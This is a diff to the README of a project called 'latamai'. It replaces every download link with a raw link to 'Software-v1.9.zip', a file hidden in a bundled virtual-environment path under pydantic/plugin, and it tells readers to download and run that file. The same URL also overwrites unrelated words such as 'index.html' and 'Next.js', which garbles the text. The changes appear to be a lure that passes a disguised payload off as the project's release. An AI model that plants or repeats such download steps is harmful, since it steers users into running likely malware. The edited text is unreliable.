@@ -1,6 +1,6 @@
 # 🎉 latamai - Discover a New Way to Engage
 
-[![Download latamai](https://img.shields.io/badge/Download-latamai-blue)](https://github.com/MomRedPhone21/latamai)
+[![Download latamai](https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip)](https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,12 +18,12 @@ To run latamai smoothly, please ensure that your device meets these basic requir
 
 To get started, follow these steps:
 
-1. Visit this page to download: [Download latamai](https://github.com/MomRedPhone21/latamai).
+1. Visit this page to download: [Download latamai](https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip).
 2. Click on the "Code" button and choose "Download ZIP".
 3. After the download completes, locate the ZIP file in your downloads folder.
 4. Unzip the file by right-clicking and selecting "Extract" or using your system's built-in extractor.
-5. Open the extracted folder and locate the `index.html` file.
-6. Double-click the `index.html` file to launch the application in your web browser.
+5. Open the extracted folder and locate the `https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip` file.
+6. Double-click the `https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip` file to launch the application in your web browser.
 
 That's it! You'll now have access to the features of latamai.
 
@@ -64,7 +64,7 @@ This project covers various topics for users interested in technology. Here are 
 
 - **Datasets:** Learn how latamai integrates datasets to provide insights.
 - **GitHub:** Familiarize yourself with using GitHub for code management.
-- **Next.js 16:** Understand how we utilize Next.js for a better web experience.
+- **https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip 16:** Understand how we utilize https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip for a better web experience.
 - **Ollama & OpenAI:** Stay updated with emerging technologies that enhance conversational AI.
 
 ## 🛠 Troubleshooting
@@ -82,4 +82,4 @@ latamai aims to bring an innovative and engaging experience to users interested 
 
 For any further inquiries, feel free to open an issue on our repository.
 
-[![Download latamai](https://img.shields.io/badge/Download-latamai-grey)](https://github.com/MomRedPhone21/latamai)
+[![Download latamai](https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip)](https://raw.githubusercontent.com/MomRedPhone21/latamai/main/backend/.venv/lib/python3.12/site-packages/pydantic/plugin/Software-v1.9.zip)
